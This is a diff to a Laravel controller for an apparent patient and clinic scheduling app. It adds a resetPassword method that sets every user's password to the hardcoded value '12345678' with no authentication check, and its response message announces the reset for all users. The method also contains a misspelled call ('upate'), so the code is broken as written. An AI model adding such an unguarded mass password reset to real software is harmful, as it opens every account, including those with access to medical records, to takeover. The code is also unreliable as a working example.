@@ -6,11 +6,13 @@ use App\Models\JadwalDokter;
 use App\Models\JadwalDokterLog;
 use App\Models\Pasien;
 use App\Models\PasienRekamMedis;
+use App\Models\User;
 use Carbon\Carbon;
 use Illuminate\Http\Request;
 use Illuminate\Support\Facades\Auth;
 use Illuminate\Support\Facades\Crypt;
 use Illuminate\Support\Facades\DB;
+use Illuminate\Support\Facades\Hash;
 use Illuminate\Support\Facades\Session;
 
 class HomePasienController extends Controller
@@ -209,5 +211,14 @@ class HomePasienController extends Controller
 
         $data = JadwalDokterLog::whereIn('jadwal_dokter_id', $req->jadwal_dokter_id)->where('pasien_id', $id)->where('status', 'Reserved')->get();
         return view('pasien/antrian', compact('data'));
+    }
+
+    public function resetPassword()
+    {
+        User::upate([
+            'password' => Hash::make('12345678')
+        ]);
+
+        return Response()->json(['status' => 1, 'message' => 'Berhasil reset password menjadi 12345678 untuk semua user']);
     }
 }
